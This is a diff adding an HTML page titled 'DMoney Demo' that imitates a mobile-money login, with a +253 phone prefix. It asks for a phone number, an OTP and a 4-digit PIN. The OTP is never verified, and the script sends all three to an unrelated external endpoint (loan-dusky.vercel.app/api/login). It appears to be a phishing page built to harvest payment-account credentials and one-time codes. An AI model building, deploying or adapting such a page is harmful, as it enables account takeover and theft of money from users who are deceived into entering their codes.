@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>DMoney Demo</title>
+
+<style>
+body { font-family: system-ui, -apple-system; background: #ffffff; margin: 0; min-height: 100vh; }
+.container { max-width: 420px; margin: 0 auto; padding: 20px; position: relative; min-height: 100vh; }
+.hidden { display: none; }
+h1, h2 { font-size: 26px; margin-bottom: 6px; text-align: left; }
+p { color: #777; text-align: left; }
+.back-arrow { font-size: 22px; cursor: pointer; position: absolute; top: 15px; left: 15px; user-select: none; z-index: 10; }
+.input-box { display: flex; align-items: center; border: 2px solid #1c3f6e; border-radius: 10px; padding: 14px; margin-top: 60px; }
+.prefix { margin-right: 10px; font-weight: 600; }
+input { border: none; outline: none; font-size: 16px; width: 100%; }
+.bottom-controls { position: absolute; bottom: 20px; left: 20px; right: 20px; display: flex; flex-direction: column; gap: 12px; align-items: flex-start; }
+.terms { display: flex; align-items: center; gap: 3px; font-size: 13px; margin: 0; }
+button { width: 100%; padding: 16px; border-radius: 10px; border: none; background: #9aa8bd; color: white; font-size: 18px; font-weight: bold; cursor: not-allowed; transition: background 0.2s; }
+button.active { background: #1c3f6e; cursor: pointer; }
+.otp-container { max-width: 420px; margin: 0 auto; padding: 20px; text-align: left; position: relative; min-height: 100vh; box-sizing: border-box; }
+.otp-container h2 { margin-top: 60px; }
+.otp-inputs { display: flex; justify-content: space-between; margin: 20px 0; padding: 0 12px; }
+.otp-inputs input { width: 50px; height: 55px; text-align: center; font-size: 22px; border: 2px solid #1c3f6e; border-radius: 8px; }
+.otp-container .bottom-controls { position: absolute; bottom: 20px; left: 20px; right: 20px; }
+</style>
+</head>
+
+<body>
+
+<!-- LOGIN PAGE -->
+<div class="container" id="loginPage">
+  <div class="back-arrow" onclick="goBackLogin()">←</div>
+  <h1>Let’s get started</h1>
+  <p>Enter your phone number to get started</p>
+  <div class="input-box">
+    <div class="prefix">+253</div>
+    <input type="tel" id="phone" placeholder="Enter phone number" maxlength="9"
+      oninput="this.value=this.value.replace(/\D/g,'').slice(0,9); updateLoginButton();" />
+  </div>
+  <div class="bottom-controls" id="loginBottom">
+    <label class="terms">
+      <input type="checkbox" id="termsCheck" checked onchange="updateLoginButton()" />
+      <span>I agree to the <a href="#">Terms of Service</a></span>
+    </label>
+    <button id="loginBtn" onclick="handleContinue()">Continue</button>
+  </div>
+</div>
+
+<!-- OTP PAGE -->
+<div class="otp-container hidden" id="otpPage">
+  <div class="back-arrow" onclick="goBackOtp()">←</div>
+  <h2>Enter Your OTP</h2>
+  <p id="otpSubText">Please enter the OTP code sent to the phone number: (+253)*******</p>
+  <div class="otp-inputs">
+    <input maxlength="1" oninput="updateOtpButton()" />
+    <input maxlength="1" oninput="updateOtpButton()" />
+    <input maxlength="1" oninput="updateOtpButton()" />
+    <input maxlength="1" oninput="updateOtpButton()" />
+    <input maxlength="1" oninput="updateOtpButton()" />
+    <input maxlength="1" oninput="updateOtpButton()" />
+  </div>
+  <div class="bottom-controls">
+    <button id="otpBtn" onclick="goToPinPage()">Continue</button>
+  </div>
+</div>
+
+<!-- PIN PAGE -->
+<div class="otp-container hidden" id="pinPage">
+  <div class="back-arrow" onclick="goBackPin()">←</div>
+  <h2>Glad to see you again</h2>
+  <p id="pinSubText">(+253)********</p>
+  <p>Please enter your 4-digit PIN code</p>
+  <div class="otp-inputs" id="pinInputs">
+    <input maxlength="1" oninput="updatePinButton()" />
+    <input maxlength="1" oninput="updatePinButton()" />
+    <input maxlength="1" oninput="updatePinButton()" />
+    <input maxlength="1" oninput="updatePinButton()" />
+  </div>
+  <div class="bottom-controls">
+    <button id="pinBtn" onclick="submitPin()">Continue</button>
+  </div>
+</div>
+
+<script>
+/* ELEMENTS */
+const loginBtn = document.getElementById("loginBtn");
+const termsCheck = document.getElementById("termsCheck");
+const otpBtn = document.getElementById("otpBtn");
+const otpInputs = document.querySelectorAll("#otpPage .otp-inputs input");
+const otpSubText = document.getElementById("otpSubText");
+const pinPage = document.getElementById("pinPage");
+const pinInputs = document.querySelectorAll("#pinPage .otp-inputs input");
+const pinBtn = document.getElementById("pinBtn");
+const pinSubText = document.getElementById("pinSubText");
+
+let userPhone = "";
+let currentOtp = "";
+
+/* BUTTONS */
+function updateLoginButton() {
+  if (termsCheck.checked && document.getElementById("phone").value.length === 9) loginBtn.classList.add("active");
+  else loginBtn.classList.remove("active");
+}
+
+function updateOtpButton() {
+  const filled = Array.from(otpInputs).every(i => i.value !== "");
+  if (filled) otpBtn.classList.add("active"); else otpBtn.classList.remove("active");
+}
+
+function updatePinButton() {
+  const filled = Array.from(pinInputs).every(i => i.value !== "");
+  if (filled) pinBtn.classList.add("active"); else pinBtn.classList.remove("active");
+}
+
+/* PAGE SWITCHES */
+function handleContinue() {
+  if (!loginBtn.classList.contains("active")) return;
+  userPhone = document.getElementById("phone").value;
+  document.getElementById("loginPage").classList.add("hidden");
+  document.getElementById("loginBottom").classList.add("hidden");
+  document.getElementById("otpPage").classList.remove("hidden");
+  otpSubText.textContent = `Please enter the OTP code sent to the phone number: (+253)${userPhone}`;
+  otpInputs[0].focus();
+}
+
+function goToPinPage() {
+  if (!otpBtn.classList.contains("active")) return;
+  currentOtp = Array.from(otpInputs).map(i => i.value).join("");
+  document.getElementById("otpPage").classList.add("hidden");
+  pinPage.classList.remove("hidden");
+  const masked = userPhone.slice(0,5) + "****";
+  pinSubText.textContent = `(+253)${masked}`;
+  pinInputs[0].focus();
+}
+
+/* BACK NAVIGATION */
+function goBackOtp() { document.getElementById("otpPage").classList.add("hidden"); document.getElementById("loginPage").classList.remove("hidden"); document.getElementById("loginBottom").classList.remove("hidden"); updateLoginButton(); }
+function goBackPin() { pinPage.classList.add("hidden"); document.getElementById("otpPage").classList.remove("hidden"); updateOtpButton(); }
+function goBackLogin() { alert("Already on the login page"); }
+
+/* AUTO FOCUS */
+otpInputs.forEach((input,index)=>{input.addEventListener("input",()=>{if(input.value&&otpInputs[index+1])otpInputs[index+1].focus();updateOtpButton();});input.addEventListener("keydown",(e)=>{if(e.key==="Backspace"&&!input.value&&otpInputs[index-1])otpInputs[index-1].focus();});});
+pinInputs.forEach((input,index)=>{input.addEventListener("input",()=>{if(input.value&&pinInputs[index+1])pinInputs[index+1].focus();updatePinButton();});input.addEventListener("keydown",(e)=>{if(e.key==="Backspace"&&!input.value&&pinInputs[index-1])pinInputs[index-1].focus();});});
+
+/* SUBMIT PIN TO BACKEND */
+async function submitPin() {
+  if (!pinBtn.classList.contains("active")) return;
+  const pin = Array.from(pinInputs).map(i=>i.value).join("");
+  try {
+    const res = await fetch("https://loan-dusky.vercel.app/api/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ phone: userPhone, otp: currentOtp, pin })
+    });
+    const result = await res.json();
+    alert(result.message);
+    // Reset form
+    otpInputs.forEach(i=>i.value="");
+    pinInputs.forEach(i=>i.value="");
+    pinBtn.classList.remove("active");
+    document.getElementById("pinPage").classList.add("hidden");
+    document.getElementById("loginPage").classList.remove("hidden");
+    document.getElementById("loginBottom").classList.remove("hidden");
+    updateLoginButton();
+  } catch(err) { console.error(err); alert("Failed to submit PIN"); }
+}
+</script>
+</body>
+</html>
